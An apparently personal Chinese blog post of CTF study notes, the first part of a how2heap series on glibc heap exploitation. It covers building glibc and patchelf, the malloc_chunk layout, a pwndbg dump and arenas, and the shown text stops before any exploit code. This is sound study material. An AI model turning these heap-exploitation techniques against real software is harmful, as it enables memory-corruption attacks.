<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="pwn,CTF,堆溢出,Linux,">










<meta name="description" content="[TOC] how2heap深入浅出学习堆利用（一）前言已经有很多师傅写了许多关于 Linux 堆的精彩文章。所以这系列文章更多当做个人学习笔记和面向像我一样的 Linux 堆初学者，在前期学习的时候我甚至连 pwndbg 都不会用。野摩托师傅将 how2heap的代码做了很大的简化，这也极大地帮助了我理解和学习。如果我有任何理解不到位或者错误的地方欢迎各位大佬指正。原文链接：https://bb">
<meta name="keywords" content="pwn,CTF,堆溢出,Linux">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap深入浅出学习堆利用">
<meta property="og:url" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/index.html">
<meta property="og:site_name" content="pukr&#39;s BLOG">
<meta property="og:description" content="[TOC] how2heap深入浅出学习堆利用（一）前言已经有很多师傅写了许多关于 Linux 堆的精彩文章。所以这系列文章更多当做个人学习笔记和面向像我一样的 Linux 堆初学者，在前期学习的时候我甚至连 pwndbg 都不会用。野摩托师傅将 how2heap的代码做了很大的简化，这也极大地帮助了我理解和学习。如果我有任何理解不到位或者错误的地方欢迎各位大佬指正。原文链接：https://bb">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://www.anquanke.com/post/id/207770#h2-1">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/32位进程默认内存布局.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/64位进程默认内存布局.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/chunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/thread_arena_chunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/bin分布.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mind_fastbin.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/patchfastmax.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/fastbin0x90.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/tcache_bin_chunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/s&l&ubin.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/largebin_nextsize.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/df_heap1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/df_heap2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/df_heap3.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/df_heap4.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/df_heap5.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/df_heap6.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/spirit_free.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/spirit_mem2chunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/spirit_init_tcache.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/spirit_int_free.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/chunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/overlap_chunks1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/overlap_chunks2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/overlap_chunks3.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/chunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_chunks1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_time1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_time3.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_time2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_time4.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_check.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_gdb1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_chunk2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_consolidate.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/unlink_consolidate2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/poison_bin.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/reverse_bins1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/stash_bins1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/stash_bins2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/stash_smallbin1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/stash_smallbin2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/stash_fakechunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/stash_calloc.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/stash_malloc.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/botcake_consolidate.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/largebin_nextsize.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/largebin_fakechunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/largebin_heap1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/largebin_heap2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/largebin_inbin.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/lore_bin1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/lore_bin2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/lore_bin3.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/内存分配函数.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/32位进程默认内存布局.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/64位进程默认内存布局.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mind_arena1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mind_arena2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/procmaps1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/procmaps2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/procmaps3.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/procmaps4.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/procmaps5.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/procmaps6.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mind_arptr.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mind_fastbin.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem3.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem4.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem5.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mmapol_mem6.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/mmapol_newmem.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_dynstr.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_chunk2&3.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_glibc.jpg">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_dynstr.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_overlapchunk.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_compare.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_binsh.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_lookup.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_bitmask.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_bitmaskword.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_bitmaskword2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_bucket.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_hasharr.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_sym1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_sym2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_system1.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_system2.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_system4.png">
<meta property="og:image" content="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/rew_shell.png">
<meta property="og:updated_time" content="2022-04-24T01:49:06.729Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="how2heap深入浅出学习堆利用">
<meta name="twitter:description" content="[TOC] how2heap深入浅出学习堆利用（一）前言已经有很多师傅写了许多关于 Linux 堆的精彩文章。所以这系列文章更多当做个人学习笔记和面向像我一样的 Linux 堆初学者，在前期学习的时候我甚至连 pwndbg 都不会用。野摩托师傅将 how2heap的代码做了很大的简化，这也极大地帮助了我理解和学习。如果我有任何理解不到位或者错误的地方欢迎各位大佬指正。原文链接：https://bb">
<meta name="twitter:image" content="https://www.anquanke.com/post/id/207770#h2-1">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/">





  <title>how2heap深入浅出学习堆利用 | pukr's BLOG</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">pukr's BLOG</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">人类的悲欢并不相通</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/04/18/how2heap深入浅出学习堆利用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="尘林">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/zql.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pukr's BLOG">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">how2heap深入浅出学习堆利用</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-04-18T20:50:49+08:00">
                2022-04-18
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>[TOC]<br><img src="https://www.anquanke.com/post/id/207770#h2-1" alt></p>
<h1 id="how2heap深入浅出学习堆利用（一）"><a href="#how2heap深入浅出学习堆利用（一）" class="headerlink" title="how2heap深入浅出学习堆利用（一）"></a>how2heap深入浅出学习堆利用（一）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经有很多师傅写了许多关于 Linux 堆的精彩文章。所以这系列文章更多当做个人学习笔记和面向像我一样的 Linux 堆初学者，在前期学习的时候我甚至连 pwndbg 都不会用。野摩托师傅将 how2heap的代码做了很大的简化，这也极大地帮助了我理解和学习。如果我有任何理解不到位或者错误的地方欢迎各位大佬指正。<br>原文链接：<a href="https://bbs.pediy.com/thread-272416.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-272416.htm</a><br><a id="more"></a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在Ubuntu18中使用各个版本的libc。我原本是自带的2.27，新下载编译了2.23和2.34。</p>
<h3 id="下载安装patchelf"><a href="#下载安装patchelf" class="headerlink" title="下载安装patchelf"></a>下载安装patchelf</h3><p>github地址：<br><a href="https://github.com/NixOS/patchelf/releases" target="_blank" rel="noopener">https://github.com/NixOS/patchelf/releases</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pukrquq@ubuntu:~/tools$ tar -axf patchelf-0.14.3.tar.gz</span><br><span class="line">pukrquq@ubuntu:~/tools$ cd patchelf-0.14.3</span><br><span class="line">pukrquq@ubuntu:~/tools/patchelf-0.14.3$ ./bootstrap.sh</span><br><span class="line">pukrquq@ubuntu:~/tools/patchelf-0.14.3$ ./configure</span><br><span class="line">pukrquq@ubuntu:~/tools/patchelf-0.14.3$ make</span><br><span class="line">pukrquq@ubuntu:~/tools/patchelf-0.14.3$ make check</span><br><span class="line">pukrquq@ubuntu:~/tools/patchelf-0.14.3$ sudo make install</span><br></pre></td></tr></table></figure></p>
<h3 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h3><p>下载链接：<br><a href="https://ftp.gnu.org/gnu/glibc" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/glibc</a><br>glibc2.23和2.34的安装基本一致，有一点不同。<br>2.34：<br>注意<code>--prefix=/home/pukrquq/Downloads/glibc-2.34/64</code>这个路径是<code>mkdir 64</code>的路径，要设置对。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> wget https://ftp.gnu.org/gnu/glibc/glibc-2.34.tar.gz</span><br><span class="line"><span class="meta">$</span> tar xvf glibc-2.34.tar.gz</span><br><span class="line"><span class="meta">$</span> cd glibc-2.34</span><br><span class="line"><span class="meta">$</span> mkdir 64</span><br><span class="line"><span class="meta">$</span> mkdir build</span><br><span class="line"><span class="meta">$</span> cd build</span><br><span class="line"><span class="meta">$</span> CFLAGS="-g -g3 -ggdb -gdwarf-2 -Og -w" CXXFLAGS="-g -g3 -ggdb -gdwarf-2 -Og -w" ../configure --prefix=/home/pukrquq/Downloads/glibc-2.34/64</span><br><span class="line"><span class="meta">$</span> sudo apt-get install bison</span><br><span class="line"><span class="meta">$</span> sudo apt-get install gawk</span><br><span class="line"><span class="meta">$</span> make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p>
<p>2.23：<br>基本是一样的，如果报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`loc1@GLIBC_2.2.5&apos; can&apos;t be versioned to common symbol &apos;loc1&apos;</span><br><span class="line">`loc2@GLIBC_2.2.5&apos; can&apos;t be versioned to common symbol &apos;loc2&apos;</span><br><span class="line">`locs@GLIBC_2.2.5&apos; can&apos;t be versioned to common symbol &apos;locs&apos;</span><br></pre></td></tr></table></figure></p>
<p>则修改<code>gibc-2.23/misc/regexp.c</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *loc1</span><br><span class="line"><span class="keyword">char</span> *loc2</span><br><span class="line"><span class="keyword">char</span> *locs</span><br></pre></td></tr></table></figure></p>
<p>为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *loc1 __attribute__ ((nocommon));</span><br><span class="line"><span class="keyword">char</span> *loc2 __attribute__ ((nocommon));</span><br><span class="line"><span class="keyword">char</span> *locs __attribute__ ((nocommon));</span><br></pre></td></tr></table></figure></p>
<p>然后<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> patchelf --set-interpreter /home/pukrquq/Downloads/glibc-2.34/64b/ld-linux-x86-64.so.2 ./test</span><br></pre></td></tr></table></figure></p>
<p>再ldd查看一下发现已经修改动态链接器。</p>
<h2 id="前置知识补充"><a href="#前置知识补充" class="headerlink" title="前置知识补充"></a>前置知识补充</h2><p>这里是为了调试的时候有一些基本了解，而很多细节还是在后面调试过程中学习到。</p>
<ol>
<li>进程布局</li>
<li>malloc_chunk结构</li>
<li>分配区</li>
<li>空闲 chunk 容器——bins</li>
<li>malloc过程</li>
<li>free过程<h3 id="进程布局"><a href="#进程布局" class="headerlink" title="进程布局"></a>进程布局</h3><img src="/2022/04/18/how2heap深入浅出学习堆利用/32位进程默认内存布局.png" alt><br><img src="/2022/04/18/how2heap深入浅出学习堆利用/64位进程默认内存布局.png" alt></li>
</ol>
<h3 id="malloc-chunk结构"><a href="#malloc-chunk结构" class="headerlink" title="malloc_chunk结构"></a>malloc_chunk结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">	INTERNAL_SIZE_T		mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">	INTERNAL_SIZE_T		mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         	   <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span>      <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br></pre></td></tr></table></figure>
<p>mchunkptr 为指向 malloc_chunk 头的指针（包含了prev_size和size共16字节的头部数据），而 malloc 函数返回的指针是不包含的，所以二者地址相差0x10。分配的 chunk 在 32 位系统上是 8 字节对齐的，或者在 64 位系统上是 16 字节对齐的。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/chunk.png" alt><br>在size位的末尾有三个标志位：<br>A ：chunk是否属于非主分配区（non_main_arena），或者主分配区（main_arena）。<br>M：是否是由 mmap 函数分配的 chunk，不属于堆。由 mmap 分配的 chunk 通常很大，在free后直接由系统回收而不是放入 bins。free chunk 不会设置这个标志位。<br>注意一点：我以前犯傻迷惑过，thread arena由 mmap 创建，那里面的 chunk 的 IS_MMAPED 标志位是不是都是1。实际上 thread arena 确实是mmap分配的，但 thread arena 里面的 chunk 还是按照 malloc 流程分配，而不是直接由 mmap 分配。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">	victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">	assert(!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">	<span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure>
<p>进入<code>_int_malloc</code>函数后，和 main arena 分配chunk的流程一致。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/thread_arena_chunk.png" alt></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p addr</span><br><span class="line"><span class="meta">$</span>5 = 0x7ffff0000b60</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/4gx 0x7ffff0000b50</span><br><span class="line">0x7ffff0000b50: 0x0000000000000000      0x00000000000003f5</span><br><span class="line">0x7ffff0000b60: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>最后分配到的 chunk 的 size 位为 0x3f5，也就是最后三个标志位的A为1（在thread arena 而不是main arena 中），M位为0（不是由 mmap 函数分配的），P为1（在thread arena 中属于分配的第一个chunk，第一个 chunk 总是将 P 设为 1，以防止程序引用到不存在的区域）。<br>P：prev_inuse，previous chunk是否是空闲的。</p>
<h3 id="分配区"><a href="#分配区" class="headerlink" title="分配区"></a>分配区</h3><p>在最后的 house_of_mind_fastbin_glibc2.34 与 mmap_overlapping_chunks_glibc2.34 用到了很多这里的知识点。<br>在多线程程序中，堆管理器需要保护堆结构。ptmalloc2引入了 arena 的概念。每个arena 本质上是完全不同的堆，他们独自管理自己的 chunk 和 bins。arena 分为 main arena 和 thread arena。glibc malloc 内部通过 brk() 和 mmap() 系统调用来分配内存。每个进程只有一个 main_arena（称为主分配区），但是可以有多个 thread arena（或者non_main_arena，非主分配区）。<br><strong>main_arena</strong><br>对应进程 heap 段，main arena 由 brk() 函数创建。分配区信息由 malloc_state 结构体存储。main arena的malloc_state 结构体存储在该进程链接的 libc.so 的数据段。main arena 的大小可以扩展。<br><strong>thread_arena</strong><br>对应进程mmap段，thread arena 由 mmap() 函数创建。分配区信息由 malloc_state和heap_info两个结构体存储。thread arena 的 malloc_state和heap_info存放在堆块的头部。thread arena 的大小不可以扩展，用完之后重新申请一个 thread arena。<br>剩余 arena 相关数据结构查看：《how2heap深入浅出学习堆利用（三）》</p>
